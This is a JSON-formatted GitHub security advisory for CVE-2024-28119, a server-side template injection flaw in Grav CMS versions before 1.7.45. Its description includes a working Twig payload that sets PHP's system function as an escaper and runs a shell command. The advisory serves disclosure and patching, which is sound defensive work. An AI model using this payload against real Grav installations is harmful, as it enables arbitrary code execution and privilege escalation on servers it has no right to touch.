{
  "Severity": "HIGH",
  "UpdatedAt": "2024-03-22T16:56:06Z",
  "Package": {
    "Ecosystem": "COMPOSER",
    "Name": "getgrav/grav"
  },
  "Advisory": {
    "DatabaseId": 238514,
    "Id": "GSA_kwCzR0hTQS0ybTd4LWM3cHgtaHA1OM4AA6Oy",
    "GhsaId": "GHSA-2m7x-c7px-hp58",
    "References": [
      {
        "Url": "https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28119"
      },
      {
        "Url": "https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe"
      },
      {
        "Url": "https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99"
      },
      {
        "Url": "https://github.com/advisories/GHSA-2m7x-c7px-hp58"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-2m7x-c7px-hp58"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-28119"
      }
    ],
    "Description": "### Summary\nDue to the unrestricted access to twig extension class from grav context, an attacker can redefine the escape function and execute arbitrary commands.\n\n### Details\nhttps://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99\n```php\n/**\n     * Defines a new escaper to be used via the escape filter.\n     *\n     * @param string   $strategy The strategy name that should be used as a strategy in the escape call\n     * @param callable $callable A valid PHP callable\n     */\n    public function setEscaper($strategy, callable $callable)\n    {\n        $this-\u003eescapers[$strategy] = $callable;\n    }\n ```\n Twig supports the functionality to redefine the escape function through the setEscaper method. \nHowever, that method is not originally exposed to the twig environment, but it is accessible through the payload below.\n\n```plaintext\n{{ grav.twig.twig.extensions.core.setEscaper('a','a') }}\n```\nAt this point, it accepts callable type as an argument, but as there is no validation for the $callable variable, attackers can set dangerous functions like system as the escaper function.\n\n\n### PoC\n```\n{{ var_dump(grav.twig.twig.extensions.core.setEscaper('system','twig_array_filter')) }}\n{{ var_dump(['id'] | escape('system', 'system')) }}\n```\n\n### Impact\nTwig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.\nAs the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-03-22T16:56:02Z",
    "Severity": "HIGH",
    "Summary": "Server Side Template Injection (SSTI) via Twig escape handler",
    "UpdatedAt": "2025-01-03T16:07:21Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.8,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "1.7.45"
      },
      "VulnerableVersionRange": "\u003c 1.7.45"
    }
  ]
}